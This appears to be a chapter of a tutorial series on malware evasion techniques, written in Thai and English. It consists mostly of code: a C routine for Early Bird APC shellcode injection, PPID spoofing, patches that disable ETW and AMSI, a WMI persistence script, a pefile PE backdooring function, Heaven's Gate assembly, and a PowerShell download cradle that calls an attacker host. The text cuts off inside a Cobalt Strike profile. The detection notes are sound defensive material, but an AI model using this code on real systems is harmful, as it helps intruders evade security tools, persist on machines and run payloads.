# Part 79: Advanced Evasion Techniques (Steps 781-790)

## Step 781: Process Injection via Early Bird APC

Early Bird APC injection เป็นเทคนิค inject shellcode เข้า process ก่อนที่ main thread จะเริ่มทำงาน

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
import ctypes
import ctypes.wintypes
import struct

@dataclass
class EarlyBirdAPC:
    """Early Bird APC injection - inject before main thread starts"""
    
    # Windows API constants
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    CREATE_SUSPENDED = 0x00000004
    PROCESS_ALL_ACCESS = 0x1F0FFF
    
    def demonstrate_concept(self) -> Dict:
        """Demonstrate Early Bird APC concept without actual execution"""
        return {
            "technique": "Early Bird APC Injection",
            "steps": [
                "1. Create target process in SUSPENDED state (CreateProcess with CREATE_SUSPENDED)",
                "2. Allocate RWX memory in suspended process (VirtualAllocEx)",
                "3. Write shellcode to allocated memory (WriteProcessMemory)",
                "4. Queue APC to main thread pointing to shellcode (QueueUserAPC)",
                "5. Resume main thread - shellcode executes before any user code (ResumeThread)"
            ],
            "advantages": [
                "Executes before security monitoring hooks are placed",
                "Harder to detect than classic injection",
                "Bypass hooks that rely on process being fully initialized"
            ],
            "detection": [
                "Monitor QueueUserAPC calls",
                "Detect CREATE_SUSPENDED followed by WriteProcessMemory",
                "Check for RWX memory allocations in new processes"
            ]
        }
    
    def generate_poc_code(self, shellcode_placeholder: bytes = b'\x90' * 32) -> str:
        """Generate Early Bird APC PoC code structure (educational)"""
        return '''
/* Early Bird APC Injection - Educational Reference */
#include <windows.h>

BOOL EarlyBirdInject(LPCTSTR targetProcess, LPBYTE shellcode, SIZE_T shellcodeSize) {
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    // Step 1: Create process in suspended state
    if (!CreateProcess(targetProcess, NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Step 2: Allocate memory in remote process
    LPVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) goto cleanup;
    
    // Step 3: Write shellcode
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, shellcodeSize, &written);
    
    // Step 4: Queue APC to main thread
    QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, 0);
    
    // Step 5: Resume - shellcode runs first
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
    
cleanup:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FALSE;
}
'''


@dataclass
class GhostWriting:
    """Ghost Writing - APC injection without WriteProcessMemory"""
    
    def explain_technique(self) -> Dict:
        return {
            "technique": "Ghost Writing",
            "description": "Use ROP gadgets to write shellcode without WriteProcessMemory",
            "steps": [
                "Find ROP gadgets in target process modules",
                "Use SetThreadContext to redirect execution to gadgets",
                "Chain gadgets to write shellcode byte by byte",
                "Transfer control to shellcode after writing"
            ],
            "advantage": "Avoids WriteProcessMemory API calls monitored by EDR"
        }


if __name__ == '__main__':
    ebird = EarlyBirdAPC()
    concept = ebird.demonstrate_concept()
    print("Early Bird APC Technique:")
    for step in concept['steps']:
        print(f"  {step}")
    
    gw = GhostWriting()
    print("\nGhost Writing:", gw.explain_technique()['description'])
```

## Step 782: PPID Spoofing and Process Masquerading

PPID Spoofing ปลอมแปลง Parent Process ID เพื่อให้ดูเหมือนว่า process ถูก spawn จาก process อื่น

```python
from dataclasses import dataclass, field
from typing import Dict, List, Optional
import struct

@dataclass
class PPIDSpoofing:
    """PPID Spoofing - fake parent process to evade detection"""
    
    def explain_ppid_spoofing(self) -> Dict:
        return {
            "technique": "PPID Spoofing",
            "purpose": "Make malicious process appear as child of legitimate process",
            "example": "Make cmd.exe appear spawned by explorer.exe instead of malware",
            "api_used": [
                "InitializeProcThreadAttributeList",
                "UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS",
                "CreateProcess with EXTENDED_STARTUPINFO_PRESENT"
            ]
        }
    
    def generate_ppid_spoof_code(self) -> str:
        return '''
/* PPID Spoofing - Set fake parent process */
#include <windows.h>
#include <tlhelp32.h>

DWORD GetProcessIdByName(LPCTSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD pid = 0;
    
    if (Process32First(snapshot, &pe)) {
        do {
            if (_tcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return pid;
}

BOOL SpawnWithFakeParent(LPCTSTR command, LPCTSTR parentProcessName) {
    DWORD parentPid = GetProcessIdByName(parentProcessName);
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    
    SIZE_T attrSize;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = 
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize);
    
    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent, sizeof(HANDLE), NULL, NULL);
    
    STARTUPINFOEX siex = {};
    siex.StartupInfo.cb = sizeof(siex);
    siex.lpAttributeList = attrList;
    
    PROCESS_INFORMATION pi;
    BOOL result = CreateProcess(NULL, (LPTSTR)command, NULL, NULL, FALSE,
                                EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
                                &siex.StartupInfo, &pi);
    
    CloseHandle(hParent);
    DeleteProcThreadAttributeList(attrList);
    return result;
}

// Usage: SpawnWithFakeParent("cmd.exe", "explorer.exe");
// cmd.exe will appear as child of explorer.exe in process tree
'''
    
    def explain_process_masquerading(self) -> Dict:
        return {
            "technique": "Process Masquerading (PEB Manipulation)",
            "description": "Modify PEB to change process name visible to tools",
            "fields_to_modify": [
                "PEB.ProcessParameters.ImagePathName - Path shown in task manager",
                "PEB.ProcessParameters.CommandLine - Command line arguments",
                "PEB.Ldr (module list) - Make imports appear legitimate"
            ],
            "tools": ["Meterpreter migrate", "Cobalt Strike spawnto", "Custom PEB manipulation"]
        }


@dataclass
class TokenManipulation:
    """Token manipulation for privilege escalation and evasion"""
    
    def token_techniques(self) -> List[Dict]:
        return [
            {
                "name": "Token Impersonation",
                "description": "Steal token from privileged process",
                "api": "OpenProcessToken + DuplicateTokenEx + ImpersonateLoggedOnUser"
            },
            {
                "name": "Token Creation",
                "description": "Create custom token (requires SeCreateTokenPrivilege)",
                "api": "NtCreateToken (undocumented)"
            },
            {
                "name": "Make Token",
                "description": "Create token from credentials",
                "api": "LogonUser + ImpersonateLoggedOnUser"
            },
            {
                "name": "UAC Bypass via Token",
                "description": "Duplicate elevated token before UAC prompt",
                "requirement": "Access to process with elevated token"
            }
        ]


if __name__ == '__main__':
    ppid = PPIDSpoofing()
    print("PPID Spoofing:", ppid.explain_ppid_spoofing()['purpose'])
    
    token = TokenManipulation()
    print("\nToken Techniques:")
    for tech in token.token_techniques():
        print(f"  - {tech['name']}: {tech['description']}")
```

## Step 783: API Hammering and Timing-Based Evasion

API Hammering และ timing evasion หลอก sandbox ด้วยการ delay execution และ ทำ operations จำนวนมาก

```python
from dataclasses import dataclass, field
from typing import List, Dict, Callable, Optional
import time
import hashlib
import math

@dataclass
class SandboxEvasion:
    """Sandbox evasion techniques using timing and environment checks"""
    
    def api_hammering(self, iterations: int = 1000000) -> Dict:
        """Simulate API hammering to exhaust sandbox timeout"""
        # Call benign API many times to waste sandbox analysis time
        start = time.time()
        results = []
        
        for i in range(min(iterations, 1000)):  # Limit for demo
            # In real impl: call GetLocalTime(), GetSystemInfo(), etc.
            results.append(hashlib.md5(str(i).encode()).hexdigest())
        
        elapsed = time.time() - start
        
        return {
            "technique": "API Hammering",
            "iterations_simulated": iterations,
            "demo_iterations": min(iterations, 1000),
            "time_elapsed": elapsed,
            "purpose": "Exhaust sandbox timeout (usually 2-5 minutes)",
            "real_apis": [
                "GetLocalTime - benign timing API",
                "GetSystemInfo - system info", 
                "GetComputerName - hostname",
                "RegOpenKey/RegCloseKey - registry access"
            ]
        }
    
    def timing_based_evasion(self) -> Dict:
        return {
            "technique": "Timing-Based Evasion",
            "methods": [
                {
                    "name": "Sleep check",
                    "description": "Sleep(10000) and check if 10s actually passed",
                    "sandbox_behavior": "Accelerate sleep calls → less time passes than expected"
                },
                {
                    "name": "CPUID timing",
                    "description": "Measure RDTSC before/after CPUID - slower in VM"
                },
                {
                    "name": "Mutex/Event timing",
                    "description": "WaitForSingleObject with timeout - check actual elapsed time"
                },
                {
                    "name": "Date/time check",
                    "description": "Only execute after specific date (time bomb)"
                }
            ]
        }
    
    def sleep_evasion_check(self, expected_sleep_ms: int = 5000) -> bool:
        """Check if sleep was accelerated (sandbox detection)"""
        start = time.time()
        time.sleep(expected_sleep_ms / 1000.0)
        elapsed_ms = (time.time() - start) * 1000
        
        # If less than 90% of expected time passed, likely in sandbox
        ratio = elapsed_ms / expected_sleep_ms
        is_sandbox = ratio < 0.9
        
        print(f"Expected: {expected_sleep_ms}ms, Actual: {elapsed_ms:.0f}ms, Ratio: {ratio:.2f}")
        print(f"Sandbox detected: {is_sandbox}")
        return is_sandbox
    
    def cpu_intensive_check(self) -> Dict:
        """Use CPU-intensive calculation as timing check"""
        # Calculate something that takes ~1 second on real hardware
        start = time.time()
        result = sum(math.sqrt(i) for i in range(1000000))
        elapsed = time.time() - start
        
        return {
            "calculation": "sqrt sum to 1M",
            "elapsed_seconds": elapsed,
            "suspiciously_fast": elapsed < 0.1,  # Too fast = possible VM acceleration
            "result_check": result  # Verify calculation wasn't shortcut
        }


@dataclass  
class EnvironmentFingerprint:
    """Check environment to detect sandbox/analysis environment"""
    
    def check_environment(self) -> Dict:
        """Multiple environment checks"""
        checks = {}
        
        # Username checks
        import os
        username = os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
        sandbox_users = ['sandbox', 'malware', 'analyst', 'cuckoo', 'virus', 
                        'sample', 'test', 'admin']
        checks['suspicious_username'] = username.lower() in sandbox_users
        checks['username'] = username
        
        # Computer name checks
        import socket
        hostname = socket.gethostname().lower()
        sandbox_hostnames = ['sandbox', 'malware', 'cuckoo', 'analysis', 
                            'virus', 'av', 'vmware', 'vbox']
        checks['suspicious_hostname'] = any(s in hostname for s in sandbox_hostnames)
        checks['hostname'] = hostname
        
        # CPU core count (sandboxes often have 1-2 cores)
        import multiprocessing
        cpu_count = multiprocessing.cpu_count()
        checks['cpu_count'] = cpu_count
        checks['low_cpu_count'] = cpu_count <= 2
        
        # Memory check (sandboxes often have < 4GB)
        import platform
        checks['platform'] = platform.platform()
        
        return checks


if __name__ == '__main__':
    evasion = SandboxEvasion()
    
    print("API Hammering simulation:")
    result = evasion.api_hammering(100000)
    print(f"  Time for {result['demo_iterations']} iterations: {result['time_elapsed']:.3f}s")
    
    print("\nSleep evasion check:")
    evasion.sleep_evasion_check(100)  # Short sleep for demo
    
    env = EnvironmentFingerprint()
    print("\nEnvironment check:")
    checks = env.check_environment()
    for k, v in checks.items():
        print(f"  {k}: {v}")
```

## Step 784: Kernel Callbacks and ETW Patching

ETW (Event Tracing for Windows) patching และ disabling kernel callbacks เพื่อ blind security tools

```python
from dataclasses import dataclass, field
from typing import Dict, List, Optional

@dataclass
class ETWPatching:
    """ETW (Event Tracing for Windows) patching to blind security tools"""
    
    def explain_etw(self) -> Dict:
        return {
            "what_is_etw": "Windows kernel tracing infrastructure used by security tools",
            "how_used": [
                "Windows Defender uses ETW for behavioral monitoring",
                "EDR solutions hook ETW providers",
                "Sysmon uses ETW for process/network events",
                "PowerShell Script Block Logging uses ETW"
            ],
            "key_providers": [
                "Microsoft-Windows-Threat-Intelligence (ETWTI)",
                "Microsoft-Windows-PowerShell",
                "Microsoft-Antimalware-Engine",
                "Microsoft-Windows-Kernel-Process"
            ]
        }
    
    def etw_patch_technique(self) -> Dict:
        return {
            "technique": "ETW Provider Patching",
            "target": "ntdll!EtwEventWrite function",
            "patch": "Replace first bytes with RET instruction (0xC3)",
            "effect": "All ETW events from process are silently dropped",
            "code_concept": """
// Patch EtwEventWrite to blind ETW-based monitoring
DWORD PatchETW() {
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    FARPROC etwWrite = GetProcAddress(ntdll, "EtwEventWrite");
    
    DWORD oldProtect;
    VirtualProtect(etwWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)etwWrite = 0xC3;  // RET - return immediately without logging
    VirtualProtect(etwWrite, 1, oldProtect, &oldProtect);
    return 0;
}
""",
            "detection": [
                "Kernel patch guard (KPP) detects kernel patches",
                "Memory integrity check on ntdll",
                "Compare in-memory ntdll with on-disk version"
            ]
        }
    
    def powershell_etw_bypass(self) -> Dict:
        return {
            "technique": "PowerShell ETW Bypass",
            "method": "Patch System.Management.Automation.dll in memory",
            "target_field": "etwProvider field in ExecutionContext",
            "powershell_code": """
# Bypass PowerShell Script Block Logging via ETW patch
$assembly = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $assembly.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)

# Patch ETW in PowerShell process
$provider = [ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwProvider = $provider.GetField('etwProvider','NonPublic,Static').GetValue($null)
[void][System.Reflection.Assembly]::LoadWithPartialName('System.Core')
$etwProvider.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider, 0)
"""
        }


@dataclass
class KernelCallbackRemoval:
    """Understand kernel callback mechanisms"""
    
    def kernel_callbacks(self) -> Dict:
        return {
            "types": [
                {
                    "name": "PsSetCreateProcessNotifyRoutine",
                    "purpose": "Notified on process create/exit",
                    "used_by": "AV, EDR for process monitoring"
                },
                {
                    "name": "PsSetCreateThreadNotifyRoutine",
                    "purpose": "Notified on thread create/exit",
                    "used_by": "EDR for thread injection detection"
                },
                {
                    "name": "PsSetLoadImageNotifyRoutine",
                    "purpose": "Notified when DLL/driver is loaded",
                    "used_by": "AV for DLL scanning"
                },
                {
                    "name": "ObRegisterCallbacks",
                    "purpose": "Pre/post callbacks on object operations",
                    "used_by": "AV for handle protection"
                },
                {
                    "name": "CmRegisterCallback",
                    "purpose": "Registry operation callbacks",
                    "used_by": "EDR for registry monitoring"
                }
            ],
            "removal_technique": "Overwrite callback pointer in kernel array (requires kernel code execution)",
            "risk": "BSoD if done incorrectly, Kernel Patch Guard detection"
        }


if __name__ == '__main__':
    etw = ETWPatching()
    print("ETW used by:")
    for use in etw.explain_etw()['how_used']:
        print(f"  - {use}")
    
    patch = etw.etw_patch_technique()
    print(f"\nETW Patch target: {patch['target']}")
    print(f"Patch byte: {patch['patch']}")
    
    cb = KernelCallbackRemoval()
    print("\nKernel Callbacks:")
    for cb_type in cb.kernel_callbacks()['types']:
        print(f"  - {cb_type['name']}: {cb_type['purpose']}")
```

## Step 785: Fileless Malware and Living-off-the-Land

Fileless malware ทำงานในหน่วยความจำโดยไม่เขียนไฟล์ลง disk และใช้ legitimate tools ที่มีอยู่แล้ว

```python
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class FilelessMalware:
    """Fileless malware techniques - operate entirely in memory"""
    
    def lolbas_techniques(self) -> Dict:
        """Living Off the Land Binaries And Scripts"""
        return {
            "concept": "Use legitimate Windows tools for malicious purposes",
            "reference": "https://lolbas-project.github.io",
            "categories": {
                "execution": [
                    {"tool": "mshta.exe", "use": "Execute HTA applications, download and run VBScript"},
                    {"tool": "wscript.exe", "use": "Execute JavaScript/VBScript payloads"},
                    {"tool": "cscript.exe", "use": "Execute scripts from command line"},
                    {"tool": "certutil.exe", "use": "Decode base64, download files (-urlcache)"},
                    {"tool": "regsvr32.exe", "use": "Execute COM scriptlets (squiblydoo)"},
                    {"tool": "rundll32.exe", "use": "Execute DLL functions"},
                    {"tool": "msiexec.exe", "use": "Install MSI packages from URL"},
                    {"tool": "InstallUtil.exe", "use": "Execute .NET code via uninstall method"}
                ],
                "download": [
                    {"tool": "bitsadmin.exe", "use": "Download files via BITS jobs"},
                    {"tool": "certutil.exe", "use": "certutil -urlcache -f URL output"},
                    {"tool": "powershell.exe", "use": "Invoke-WebRequest, WebClient.DownloadFile"},
                    {"tool": "wget (built-in)", "use": "Available in newer Windows versions"}
                ],
                "lateral_movement": [
                    {"tool": "wmic.exe", "use": "Remote process creation: wmic /node: process call create"},
                    {"tool": "psexec.exe", "use": "Sysinternals - remote execution"},
                    {"tool": "at.exe / schtasks.exe", "use": "Scheduled task creation remotely"}
                ]
            }
        }
    
    def powershell_fileless(self) -> Dict:
        return {
            "technique": "PowerShell Fileless Execution",
            "methods": [
                {
                    "name": "Encoded Command",
                    "command": "powershell -enc <base64_encoded_script>",
                    "advantage": "Bypasses simple string-based detection"
                },
                {
                    "name": "Download Cradle",
                    "command": "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')",
                    "advantage": "No file written to disk"
                },
                {
                    "name": "Reflection",
                    "command": "[Reflection.Assembly]::Load([byte[]]$bytes)",
                    "advantage": "Load .NET assembly directly from bytes"
                },
                {
                    "name": "WMI Execution",
                    "command": "[wmiclass]'Win32_Process').Create('powershell.exe -enc ...')",
                    "advantage": "Spawns process from WMI host process"
                }
            ]
        }
    
    def registry_based_persistence(self) -> Dict:
        return {
            "technique": "Registry-based Fileless Persistence",
            "method": "Store payload in registry, execute with legitimate tools",
            "example": {
                "store": "reg add HKCU\\Software\\Classes\\payload /v data /t REG_SZ /d <base64_payload>",
                "execute": "powershell -c \"IEX ([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\Classes\\payload).data)))\"",
                "persist": "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d \"powershell -WindowStyle Hidden -c <above command>\""
            }
        }


@dataclass
class WMIPersistence:
    """WMI-based fileless persistence"""
    
    def wmi_event_subscription(self) -> Dict:
        return {
            "technique": "WMI Permanent Event Subscription",
            "components": [
                "EventFilter - defines triggering condition",
                "EventConsumer - action to take when triggered",
                "FilterToConsumerBinding - links filter to consumer"
            ],
            "types_of_consumers": [
                "ActiveScriptEventConsumer - run VBScript/JScript",
                "CommandLineEventConsumer - execute command",
                "SMTPEventConsumer - send email",
                "NTEventLogEventConsumer - write to event log",
                "LogFileEventConsumer - write to log file"
            ],
            "persistence_script": """
# WMI Permanent Event Subscription via PowerShell
$filterName = 'SystemUpdate'
$consumerName = 'SystemUpdate'
$command = 'powershell.exe -WindowStyle Hidden -enc <payload>'

# Create event filter (trigger: every 60 seconds)
$filterArgs = @{
    EventNamespace = 'root\\cimv2'
    Name = $filterName
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments $filterArgs

# Create consumer (action)
$consumerArgs = @{
    Name = $consumerName
    CommandLineTemplate = $command
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments $consumerArgs

# Bind filter to consumer
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments $bindingArgs
"""
        }


if __name__ == '__main__':
    fileless = FilelessMalware()
    lolbas = fileless.lolbas_techniques()
    print("LOLBAS Execution tools:")
    for tool in lolbas['categories']['execution']:
        print(f"  {tool['tool']}: {tool['use']}")
    
    print("\nPowerShell Fileless methods:")
    for method in fileless.powershell_fileless()['methods']:
        print(f"  - {method['name']}: {method['advantage']}")
```

## Step 786: Code Cave Injection and PE Backdooring

Code Cave injection ใส่ shellcode เข้าไปใน PE file ที่มีอยู่แล้ว โดยหา section ที่มี null bytes

```python
from dataclasses import dataclass, field
from typing import Optional, List, Tuple
import struct

@dataclass
class CodeCaveInjection:
    """Code cave injection into PE files"""
    
    def find_code_caves(self, pe_path: str, min_size: int = 100) -> List[Dict]:
        """Find code caves in PE file (regions of null bytes)"""
        caves = []
        
        try:
            with open(pe_path, 'rb') as f:
                data = f.read()
        except FileNotFoundError:
            # Demo mode
            data = b'\x00' * 200 + b'\x90' * 50 + b'\x00' * 150 + b'MZ' + b'\x00' * 500
        
        i = 0
        while i < len(data):
            if data[i] == 0x00:
                start = i
                while i < len(data) and data[i] == 0x00:
                    i += 1
                size = i - start
                if size >= min_size:
                    caves.append({
                        'offset': hex(start),
                        'size': size,
                        'usable': size - 5  # Leave room for JMP back
                    })
            else:
                i += 1
        
        return caves
    
    def explain_backdooring(self) -> Dict:
        return {
            "technique": "PE Backdooring via Code Cave",
            "steps": [
                "1. Parse PE header to find sections",
                "2. Find code cave (null byte region) large enough for shellcode",
                "3. Write shellcode to code cave",
                "4. Add JMP/CALL from shellcode back to original entry point",
                "5. Modify entry point (AddressOfEntryPoint) to point to shellcode",
                "6. Adjust section permissions if needed (add EXECUTE flag)"
            ],
            "preservation": "Save original entry point and JMP back to it after shellcode runs",
            "tools": ["msfvenom --platform windows -x original.exe", "backdoor-factory", "custom scripts"]
        }
    
    def generate_pe_patch_structure(self) -> str:
        return '''
/* PE Backdooring Structure (Educational) */

// Shellcode stub that saves context and jumps back:
// PUSHAD          - save all registers
// PUSHFD          - save flags
// [shellcode]     - actual payload  
// POPAD           - restore registers
// POPFD           - restore flags
// JMP original_ep - jump to legitimate entry point

// Python PE manipulation:
import pefile

def backdoor_pe(input_path, output_path, shellcode):
    pe = pefile.PE(input_path)
    
    # Find code cave in .text section
    for section in pe.sections:
        if section.Name.rstrip(b"\x00") == b".text":
            raw_data = section.get_data()
            
            # Find null byte region
            null_start = raw_data.find(b"\x00" * len(shellcode))
            if null_start != -1:
                # Get virtual address of cave
                cave_va = section.VirtualAddress + null_start
                cave_rva = section.PointerToRawData + null_start
                
                # Save original entry point
                original_ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                
                # Build complete shellcode with JMP back
                # [shellcode] + relative JMP to original EP
                jmp_offset = original_ep - (cave_va + len(shellcode) + 5)
                jmp_instruction = b"\xe9" + struct.pack("<i", jmp_offset)
                complete_payload = shellcode + jmp_instruction
                
                # Patch PE
                pe.set_bytes_at_offset(cave_rva, complete_payload)
                pe.OPTIONAL_HEADER.AddressOfEntryPoint = cave_va
                pe.write(output_path)
                return True
    
    return False
'''


@dataclass
class SectionInjection:
    """Add new section to PE for shellcode storage"""
    
    def add_section_technique(self) -> Dict:
        return {
            "technique": "New Section Injection",
            "steps": [
                "1. Parse PE headers",
                "2. Increment NumberOfSections in FileHeader",
                "3. Add new section header (name, size, characteristics)",
                "4. Set characteristics: IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
                "5. Append shellcode to end of file",
                "6. Redirect entry point to new section"
            ],
            "advantage": "More space available than code caves",
            "detection": [
                "Unusual section names (.xxx, .cave, .extra)",
                "Section with high entropy",
                "RWX section added to signed binary",
                "Authenticode signature becomes invalid"
            ]
        }


if __name__ == '__main__':
    cave = CodeCaveInjection()
    print("Code Cave Injection steps:")
    for step in cave.explain_backdooring()['steps']:
        print(f"  {step}")
    
    section = SectionInjection()
    print("\nSection injection detection:")
    for indicator in section.add_section_technique()['detection']:
        print(f"  - {indicator}")
```

## Step 787: Heaven's Gate and WoW64 Exploitation

Heaven's Gate เป็น technique ที่ใช้ transition จาก 32-bit code ไปยัง 64-bit execution ใน WoW64 layer

```python
from dataclasses import dataclass, field
from typing import Dict, List

@dataclass
class HeavensGate:
    """Heaven's Gate - 32-bit to 64-bit transition technique"""
    
    def explain_wow64(self) -> Dict:
        return {
            "what_is_wow64": "Windows on Windows 64 - compatibility layer for 32-bit processes on 64-bit Windows",
            "architecture": [
                "32-bit process uses 32-bit ntdll.dll (in System32/SysWow64)",
                "WoW64 layer intercepts syscalls",
                "Translates 32-bit calls to 64-bit",
                "64-bit ntdll.dll actually makes the syscall"
            ],
            "heavens_gate": {
                "description": "Far JMP with selector 0x33 switches to 64-bit mode",
                "memory_segment": "0x33 = 64-bit code segment selector",
                "usage": "Execute 64-bit shellcode from 32-bit process"
            }
        }
    
    def heavens_gate_asm(self) -> str:
        return '''
; Heaven's Gate - switch to 64-bit mode from 32-bit process
; This allows 32-bit process to execute 64-bit code

[BITS 32]

; Push 64-bit address to jump to (8 bytes)
push 0x00000000      ; high 32 bits of 64-bit address
push heavens_gate_64 ; low 32 bits

; Far jump to selector 0x33 (64-bit code segment)
db 0xEA              ; far jmp opcode
dd heavens_gate_64   ; 64-bit entry point
dw 0x33              ; CS selector for 64-bit mode

[BITS 64]
heavens_gate_64:
    ; Now executing in 64-bit context!
    ; Can access 64-bit registers, full 64-bit address space
    ; Can make direct 64-bit syscalls
    
    ; Example: direct 64-bit NtAllocateVirtualMemory syscall
    mov r10, rcx        ; syscall convention: move rcx to r10
    mov eax, 0x18       ; syscall number for NtAllocateVirtualMemory
    syscall
    
    ; Return to 32-bit mode
    push 0x23           ; 32-bit code segment selector
    push back_to_32bit  ; address to return to
    retf                ; far return switches segment

[BITS 32]
back_to_32bit:
    ; Back in 32-bit mode
    ret
'''
    
    def evasion_benefits(self) -> Dict:
        return {
            "why_use_heavens_gate": [
                "32-bit AV/EDR may not monitor 64-bit syscalls",
                "Hook bypass: 32-bit hooks in SysWow64 ntdll not reached",
                "Some security tools don't inspect WoW64 transitions",
                "Access 64-bit APIs from 32-bit process"
            ],
            "detection_methods": [
                "Far jump with segment 0x33 in 32-bit process",
                "CS register = 0x33 in what appears to be 32-bit process",
                "64-bit code executing in 32-bit process address space"
            ],
            "tools": ["HellsGate (direct syscall via Heaven's Gate)", "RecycledGate", "TartarusGate"]
        }


@dataclass
class DirectSyscalls:
    """Direct syscalls to bypass user-mode hooks"""
    
    def syscall_techniques(self) -> List[Dict]:
        return [
            {
                "name": "Static Syscalls",
                "method": "Hard-code syscall numbers for specific Windows version",
                "limitation": "Syscall numbers change between Windows versions"
            },
            {
                "name": "Dynamic Syscalls (HellsGate)",
                "method": "Read syscall numbers from clean ntdll.dll at runtime",
                "advantage": "Works across Windows versions"
            },
            {
                "name": "SysWhispers2/3",
                "method": "Generate direct syscall stubs for specific APIs",
                "advantage": "No ntdll dependency, handles all Windows versions"
            },
            {
                "name": "TartarusGate",
                "method": "Find unhooked syscalls above/below hooked ones (neighboring syscalls)",
                "advantage": "Works even when some syscalls are hooked"
            }
        ]
    
    def get_syscall_number_method(self) -> str:
        return '''
; Read syscall number from ntdll function
; For NtAllocateVirtualMemory:

Mov EAX, ??? ; ntdll function starts with: MOV EAX, <syscall_number>
Mov R10, RCX ; EDX/R10 check for WoW64
Syscall      ; execute kernel
Ret

// Read the SSN (System Service Number):
FARPROC proc = GetProcAddress(GetModuleHandle("ntdll"), "NtAllocateVirtualMemory");
BYTE* bytes = (BYTE*)proc;

// If not hooked: MOV EAX, xx (0xB8 xx 00 00 00)
if (bytes[0] == 0xB8) {
    DWORD ssn = *(DWORD*)(bytes + 1);  // syscall number
    // Use this SSN in direct syscall stub
}

// If hooked (JMP to hook): bytes[0] == 0xE9 or 0xFF
// Need to use neighboring syscall technique
'''


if __name__ == '__main__':
    hg = HeavensGate()
    print("Heaven's Gate - WoW64 exploitation")
    print("Benefits:")
    for benefit in hg.evasion_benefits()['why_use_heavens_gate']:
        print(f"  - {benefit}")
    
    syscalls = DirectSyscalls()
    print("\nDirect Syscall Techniques:")
    for tech in syscalls.syscall_techniques():
        print(f"  {tech['name']}: {tech['method']}")
```

## Step 788: Network Traffic Obfuscation and C2 Evasion

การซ่อน C2 traffic โดยการใช้ domain fronting, traffic shaping และ protocol blending

```python
from dataclasses import dataclass, field
from typing import Dict, List, Optional
import base64
import json
import hashlib
import time

@dataclass
class C2Evasion:
    """C2 traffic obfuscation and evasion techniques"""
    
    c2_profiles: List[Dict] = field(default_factory=list)
    
    def domain_fronting(self) -> Dict:
        return {
            "technique": "Domain Fronting",
            "description": "Route C2 traffic through CDN/trusted services",
            "how_it_works": [
                "Connect to CDN edge node (e.g., CloudFront, Azure CDN)",
                "SNI/Host header = legitimate domain (e.g., microsoft.com on CloudFront)",
                "HTTP Host header = actual C2 domain (both on same CDN)",
                "CDN routes request to C2 server based on Host header",
                "HTTPS encryption hides actual destination"
            ],
            "cdns_previously_used": ["AWS CloudFront", "Azure CDN", "Google Cloud CDN"],
            "status": "Partially mitigated by CDN providers, but variants still exist",
            "variant": "Domain Hiding - similar but using redirectors"
        }
    
    def traffic_shaping(self) -> Dict:
        return {
            "technique": "Traffic Shaping/Malleable C2",
            "purpose": "Make C2 traffic look like legitimate protocols",
            "cobalt_strike_malleable": {
                "description": "Cobalt Strike profile to customize beacon traffic",
                "example_profile": """
set sleeptime "60000";  # 60 second beacon interval
set jitter "20";         # +/- 20% timing variation
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...";

http-get {
    set uri "/jquery-3.3.1.slim.min.js";
    client {
        header "Accept" "text/html,application/json";
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/javascript";
        output {
            prepend "jQuery.fn.jquery=";";
